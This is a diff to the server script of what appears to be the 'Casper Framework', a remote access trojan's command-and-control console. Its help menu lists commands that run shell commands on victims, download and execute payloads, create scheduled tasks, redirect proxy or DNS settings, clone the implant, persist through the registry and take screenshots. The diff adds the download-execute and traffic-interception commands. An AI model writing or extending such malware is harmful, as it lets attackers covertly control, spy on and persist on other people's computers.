@@ -1,7 +1,7 @@
-'''
+"""
 Part of Casper Framework
-'''
-from framework.includes import *
+"""
+from framework.imports import *
 
 host = "127.0.0.1"
 port = 4445    
@@ -43,8 +43,9 @@ if __name__ == '__main__':
 	 
  Available commands:
     * shell cmd                   <sends shell command>
-    * download url                <download and execute via shell>
+    * downexec url                <download and execute via shell>
     * schtasks create/delete/run  <create/delete/run schtasks tasks>
+    * intercept proxy/dns         <add proxy or change dns server>
     * clone                       <clones myself to temp directory>
     * infect                      <adds itself to startup via registry>
     * screenshot                  <takes screenshot>
@@ -70,7 +71,7 @@ if __name__ == '__main__':
 								file.write(data)
 								file.close()
 							except Exception as e:
-								print "[casper server] can't write screenshot.png to disk >> {}".format(e)
+								print "[casper server] can't write screenshot.png to disk: {}".format(e)
 
 							data = decode(client.recv(11048576))
 							print data
